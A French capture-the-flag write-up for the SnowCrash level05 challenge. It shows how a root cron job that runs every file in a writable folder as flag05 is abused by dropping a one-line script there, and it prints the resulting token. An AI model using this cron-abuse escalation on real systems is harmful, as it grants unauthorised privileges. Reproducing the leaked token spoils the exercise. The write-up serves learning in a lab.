# LEVEL05

``` bash
level05@192.168.56.101's password: 
You have new mail.
level05@SnowCrash:~$ 
```

Recherche d'un "mail" dans le dossier var

``` bash
level05@SnowCrash:/$ cd var
level05@SnowCrash:/var$ ls -la
total 0
drwxr-xr-x 1 root root     160 Mar 12  2016 .
drwxr-xr-x 1 root root     240 Mar 17 10:47 ..
drwxr-xr-x 2 root root       3 Apr 19  2012 backups
drwxr-xr-x 1 root root      60 Aug 30  2015 cache
drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash
drwxr-xr-x 1 root root     180 Mar 17 10:47 lib
drwxrwsr-x 2 root staff      3 Apr 19  2012 local
lrwxrwxrwx 1 root root       9 Aug 29  2015 lock -> /run/lock
drwxr-xr-x 1 root root     300 Mar 17 10:47 log
drwxrwsr-x 1 root mail      60 Mar  5  2016 mail
drwxr-xr-x 2 root root       3 Aug 29  2015 opt
lrwxrwxrwx 1 root root       4 Mar 12  2016 run -> /run
drwxr-xr-x 5 root root      70 Aug 29  2015 spool
d-wx-wx-wx 1 root root      40 Mar  5  2016 tmp
drwxr-xr-x 1 root root     100 Mar 17 10:47 www

level05@SnowCrash:/var$ cd mail
level05@SnowCrash:/var/mail$ ls
level05
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```
On est face a une commande crontab
`*/2 * * * *` : commande executee toutes les 2 minutes
`- flag05` : commande executee sous l'identite de flag05
`sh /usr/sbin/openarenaserver` le script execute


Recherche du script en question:

``` bash

level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

level05@SnowCrash:/usr/sbin$ ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

```

Affichage du contenu du script:

``` bash

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

`ulimit -t 5` limite le temps CPU 
temps pendant lequel le processus utilise reellement le CPU (processus == shell et commandes lancees)
ici apres 5 secondes le kernel envoi SIGXCPU et tue le programme 

`(    )` cree un subshell, les changements ne modifient pas le shell parent

`bash -x` active le mode debug, les commandes executees sont affichees

.sh

Le script execute les fichiers presents dans /usr/sbin/openarenaserver
Probleme, si le script est lance par le systreme en arriere plan, on ne verra pas le resultat sur le terminal.
Comme le script est lance par le cron job le resultat nest pas dirige vers la sortie standard
Il faut forcer une commande a ecrire son resultat dans un fichier quon pourra lire plus tard. Par ex dans /tmp/

On regarde les permissions que l'on a sur le dossier openarenaserver:

``` bash
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root root 40 Mar  5 10:43 .
drwxr-xr-x  1 root root 60 Mar  5 10:43 ..
```

Le `+` sifnifie qu'il y a des precisions sur les permissions a regarder avec getfacl.
ACL (Access Control Lists)


``` bash
level05@SnowCrash:/opt/openarenaserver$ getfacl .
# file: .
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x

```

On a le droit sur les fichiers present dans le dossier
On va donc creer un script pour recupere le token avec getflag, mais on ne peux pas mettre le resultat dans un fichier dans /opt/openarenaserver car le script supprime les fichiers presents dans le dossier des quil execute les scripts. On ne peux pas non plus executer  dans un fichier creer dans /tmp/
Le fichier est cree avec les droits de flag05 (qui execute le script) et cree un fichier dans un dossier ou l'on a le droit de lire
``` bash
level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/myfile" > script.sh
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/myfile
Check flag.Here is your token : viuaaale9huek52boumoomioc
```


